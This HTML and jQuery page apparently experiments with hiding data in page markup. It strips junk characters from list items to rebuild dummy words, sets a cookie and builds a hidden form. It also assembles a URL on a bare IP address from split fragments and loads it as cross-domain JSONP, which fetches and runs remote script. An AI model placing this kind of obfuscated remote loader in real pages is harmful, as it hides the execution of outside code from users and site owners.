<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
	<title>Title</title>
</head>
<body>

	<ul>
		<li name="dataform1">hi5}/</li>
		<li name="dataform2">m9/.y3</li>
		<li name="dataform3">na12[me</li>
		<li name="dataform4">i=s</li>
		<li name="dataform5">coo[1'ki\e</li>
		<li name="dataform6">fi*rs2t</li>
		<li name="dataform7">sec)(on#d</li>
		<li name="dataform8">th11ir2d</li>
		<li name="dataform9">f2o_ur+th</li>
		<li name="dataform10">f-if+t87h</li>
		<li name="dataform11">si6x9)th</li>
		<li name="dataform12">se7v7en;t3h3</li>
		<li name="dataform13">e2i$gh$th</li>
	</ul>

	<div class="first">
		<p>window.location="http://185.174.63.223/"</p>
		<div class="second">
			<p>nextdata="/ajaxishere/"</p>
			<div class="third">
				<p>finalpart="aj.php"</p>
			</div>
		</div>
	</div>

	<div id="resultHere"></div>

</body>
</html>
<script>

	let data = [];
	let regexFull = /[\W\d_]/g;
	let regexLight = /[\W]/g;
	$('li').each(function() {

		let originalName = $(this).attr('name');
		let originalText = $(this).text();

		let formatedName = originalName.replace(regexLight, '');
		let formatedText = originalText.replace(regexFull, '');

		data.push([formatedName, formatedText]);

	});

	let str = '';
	for( let i = 0; i < 5; i++ )
		str += data[i][1];

	document.cookie = "decoded = " + str;

	let form = '<form id="mainForm">';
	for( let i = 5; i < data.length; i++ )
		form += '<input type="hidden" name="' + data[i][0] + '" value="' + data[i][1] + '">';
	form += '</form>';
	$('body').append(form);

	let url = $('.first > p').text();
	url = url.substring(url.indexOf('="') + 2, url.length - 2);

	let folder = $('.first .second > p').text();
	folder = folder.substring(folder.indexOf('="') + 2, folder.length - 1);

	let file = $('.first .second .third p').text();
	file = file.substring(file.indexOf('="') + 2, file.length - 1);

	let fullUrl = url + folder + file;

	<?php header("Access-Control-Allow-Headers: *"); ?>

	$.ajax({
		url: fullUrl,
		dataType: 'jsonp',
		crossDomain: true,
		success: function() {
			alert("Success");
		},
		error: function() {
			alert('Failed because of CORB!');
		},
		beforeSend: function(xhr) {
			xhr.overrideMimeType("text/plain; charset=x-user-defined");
		}
	})
	.done(function(data) {
		console.log(data);
	});

	let result = '';

	for( let i = 0; i < data.length; i++ )
		result += 'Data field name: ' + data[i][0] + ' == content: ' + data[i][1] + '<br>';

	result += 'URL: ' + fullUrl;

	$('#resultHere').html(result);

</script>
